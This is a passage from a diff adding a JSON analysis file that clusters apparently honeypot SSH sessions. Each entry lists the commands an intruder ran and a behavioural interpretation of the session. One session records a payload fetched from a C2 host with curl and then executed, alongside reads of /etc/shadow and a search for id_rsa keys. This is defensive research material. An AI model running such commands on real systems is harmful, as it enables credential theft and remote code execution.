+      "session_id": "ca8bbbfd6366",
+      "dec_cluster": 1,
+      "evidence_count": 9,
+      "observed_command_categories": "credential_attack, file_system, privilege_escalation, reconnaissance",
+      "observed_commands": "cat /etc/passwd, exit, ls -la, pwd, uname -a, whoami",
+      "behavioural_interpretation": "Mixed/Unclassified",
+      "evidence": "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.383391"
+    },
+    {
+      "session_id": "a6c3b1926d4e",
+      "dec_cluster": 1,
+      "evidence_count": 9,
+      "observed_command_categories": "credential_attack, file_system, privilege_escalation, reconnaissance",
+      "observed_commands": "cat /etc/passwd, exit, ls -la, pwd, uname -a, whoami",
+      "behavioural_interpretation": "Mixed/Unclassified",
+      "evidence": "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.278874"
+    },
+    {
+      "session_id": "916f7f25e36c",
+      "dec_cluster": 1,
+      "evidence_count": 11,
+      "observed_command_categories": "file_system, file_transfer, networking, privilege_escalation, reconnaissance",
+      "observed_commands": "./payload &, cat /etc/shadow, chmod +x payload, curl http://10.0.0.1/c2_payload > payload, exit, find / -name id_rsa 2>/dev/null, id",
+      "behavioural_interpretation": "Download or payload retrieval",
+      "evidence": "Observed commands: ./payload &, cat /etc/shadow, chmod +x payload, curl http://10.0.0.1/c2_payload > payload, exit; Command categories: file_system, file_transfer, networking, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 21.895156"
+    },
+    {
+      "session_id": "e6aae1f4915d",
+      "dec_cluster": 1,
+      "evidence_count": 9,
+      "observed_command_categories": "credential_attack, file_system, privilege_escalation, reconnaissance",
+      "observed_commands": "cat /etc/passwd, exit, ls -la, pwd, uname -a, whoami",
+      "behavioural_interpretation": "Mixed/Unclassified",
+      "evidence": "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 12.300721"
+    }
+  ],
+  "notes": {
+    "cluster_ids_are_not_attack_labels": true,
+    "feature_source_used": "DEC results file (contains session ID + cluster assignment + the same numerical feature columns used to cluster the sessions)"
+  }
+}
